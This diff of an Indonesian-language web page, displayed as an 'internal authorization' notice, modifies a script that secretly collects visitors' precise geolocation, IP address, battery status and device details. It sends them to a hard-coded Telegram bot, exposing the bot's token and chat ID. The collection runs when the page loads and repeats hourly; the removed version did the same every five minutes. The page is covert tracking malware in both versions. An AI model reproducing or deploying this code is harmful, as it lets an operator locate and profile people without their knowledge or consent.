@@ -12,19 +12,20 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      text-align: center;
-      padding: 60px 20px 20px 20px;
+      justify-content: flex-start;
       height: 100vh;
+      text-align: center;
+      padding: 40px 20px 20px;
     }
     img.logo {
-      width: 200px;
+      width: 190px;
       margin-bottom: 25px;
       filter: grayscale(100%) brightness(150%);
     }
     h1 {
       color: #ff4444;
       font-size: 1.4em;
-      margin-bottom: 12px;
+      margin-bottom: 15px;
     }
     p {
       color: #00ffff;
@@ -38,94 +39,72 @@
   <p>Prosedur otorisasi internal sedang berlangsung. Sistem dalam status validasi sumber akses.</p>
 
   <script>
-    const botToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko"; // @OpsBorneo_Bot
+    const botToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
     const chatId = 5677912817;
 
-    async function sendToTelegram(text) {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: chatId, text: text })
       });
     }
 
-    async function getIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip;
-      } catch {
-        return "Unknown";
-      }
+    function getIP() {
+      return fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => data.ip)
+        .catch(() => "Tidak tersedia");
     }
 
-    async function sendData() {
-      try {
-        const pos = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+    function getBatteryInfo() {
+      if (navigator.getBattery) {
+        return navigator.getBattery().then(bat => {
+          return `Baterai: ${Math.round(bat.level * 100)}% ${bat.charging ? "(Mengisi)" : ""}`;
         });
-
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const speed = pos.coords.speed ?? 'Unknown';
-        const heading = pos.coords.heading ?? 'Unknown';
-        const altitude = pos.coords.altitude ?? 'Unknown';
-        const accuracy = pos.coords.accuracy + 'm';
-
-        const battery = await navigator.getBattery();
-        const batLevel = Math.round(battery.level * 100);
-        const charging = battery.charging ? 'Yes' : 'No';
-
-        const screenRes = `${screen.width}x${screen.height}`;
-        const lang = navigator.language;
-        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const localTime = new Date().toLocaleString();
-        const utcTime = new Date().toUTCString();
-        const ua = navigator.userAgent;
-        const platform = navigator.platform;
-
-        const connection = navigator.connection || {};
-        const netType = connection.effectiveType || 'Unknown';
-        const downSpeed = connection.downlink || 'Unknown';
-
-        const ip = await getIP();
-
-        const rawID = ua + screenRes + tz + lang;
-        const buffer = new TextEncoder().encode(rawID);
-        const digest = await crypto.subtle.digest('SHA-256', buffer);
-        const hashArray = Array.from(new Uint8Array(digest));
-        const ID = 'USR-' + hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 10).toUpperCase();
-
-        const text = `
-[${ID}]
-IP: ${ip}
-Lokasi: ${lat}, ${lon}
-Map: https://maps.google.com/?q=${lat},${lon}
-Akurasi: ${accuracy}
-Speed: ${speed}
-Heading: ${heading}
-Altitude: ${altitude}
-
-Waktu Lokal: ${localTime}
-UTC: ${utcTime}
-Timezone: ${tz}
-Lang: ${lang}
-
-Battery: ${batLevel}% (Charging: ${charging})
-Network: ${netType} | Downlink: ${downSpeed} Mbps
-Device: ${platform}
-Screen: ${screenRes}
-UserAgent: ${ua}
-`;
-
-        sendToTelegram(text);
-      } catch (e) {
-        sendToTelegram("Gagal mengambil data: " + e.message);
+      } else {
+        return Promise.resolve("Baterai: Tidak didukung");
       }
     }
 
-    sendData();
-    setInterval(sendData, 5 * 60 * 1000); // ulang setiap 5 menit
+    function getDeviceInfo() {
+      return [
+        `User Agent: ${navigator.userAgent}`,
+        `Resolusi: ${screen.width}x${screen.height}`,
+        `Bahasa: ${navigator.language}`,
+        `Waktu Lokal: ${new Date().toLocaleString()}`
+      ].join('\n');
+    }
+
+    function kirimSemuaData() {
+      Promise.all([getIP(), getBatteryInfo()])
+        .then(([ip, bat]) => {
+          navigator.geolocation.getCurrentPosition(pos => {
+            const lat = pos.coords.latitude.toFixed(6);
+            const lon = pos.coords.longitude.toFixed(6);
+            const acc = pos.coords.accuracy;
+            const lokasi = `Lokasi: ${lat}, ${lon} (±${acc} m)`;
+
+            const info = [
+              "*[DatabaseNusantara Deteksi]*",
+              lokasi,
+              `IP: ${ip}`,
+              bat,
+              getDeviceInfo()
+            ].join('\n');
+
+            sendToTelegram(info);
+          }, err => {
+            sendToTelegram("Gagal akses lokasi: " + err.message);
+          });
+        });
+    }
+
+    // Kirim pertama kali saat dibuka
+    kirimSemuaData();
+
+    // Ulangi setiap 1 jam (3600000 ms)
+    setInterval(kirimSemuaData, 3600000);
   </script>
 </body>
 </html>
